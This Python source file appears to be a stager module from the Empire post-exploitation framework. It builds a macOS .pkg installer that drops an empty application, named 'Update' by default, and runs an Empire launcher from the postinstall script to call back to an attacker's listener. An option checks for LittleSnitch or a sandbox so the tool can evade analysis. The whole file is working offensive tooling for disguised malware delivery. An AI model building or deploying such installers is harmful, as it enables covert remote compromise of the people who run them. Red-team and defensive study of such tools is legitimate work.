from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'pkg',

            'Author': ['@xorrior'],

            'Description': ('Generates a pkg installer. The installer will copy a custom (empty) application to the /Applications folder. The postinstall script will execute an Empire launcher.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'python'
            },
            'AppIcon' : {
                'Description'   :   'Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to none.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'AppName' : {
                'Description'   :   'Name of the Application Bundle. This change will reflect in the Info.plist and the name of the binary in Contents/MacOS/.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'File to write dmg volume to.',
                'Required'      :   True,
                'Value'         :   '/tmp/out.pkg'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        SafeChecks = self.options['SafeChecks']['Value']
        icnsPath = self.options['AppIcon']['Value']
        AppName = self.options['AppName']['Value']
        arch = 'x64'

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, userAgent=userAgent, safeChecks=SafeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        else:
            if AppName == '':
                AppName = "Update"
            Disarm=True
            launcherCode = launcher.strip('echo').strip(' | python &').strip("\"")
            ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcherCode,Arch=arch,icon=icnsPath,AppName=AppName,disarm=Disarm)
            pkginstaller = self.mainMenu.stagers.generate_pkg(launcher=launcher,bundleZip=ApplicationZip,AppName=AppName)
            return pkginstaller
